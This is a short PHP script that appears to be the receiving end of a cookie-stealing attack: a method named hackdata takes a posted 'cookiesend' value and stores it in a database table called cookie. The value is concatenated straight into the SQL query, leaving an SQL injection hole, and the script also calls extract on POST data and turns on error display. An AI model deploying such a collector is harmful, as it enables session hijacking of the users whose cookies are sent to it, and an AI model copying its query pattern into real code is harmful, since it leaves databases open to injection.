<?php

ini_set('display_errors', 1);

include $_SERVER['DOCUMENT_ROOT'] . "/test/db.php";

class Post
{

    public function __construct()
    {

    }

    public function hackdata()
    {
        extract($_POST);
        $db = new DB();
        $data = $_POST['cookiesend'];
        $sql = "insert into cookie values('$data')";

        $db->query($sql);

        // if (isset($_POST['cookiesend'])) {
        //     $sql = "insert into cookie values('sdsd')";
        //     $db->query($sql);
        // }
    }

}

$post = new Post();

$post->hackdata();
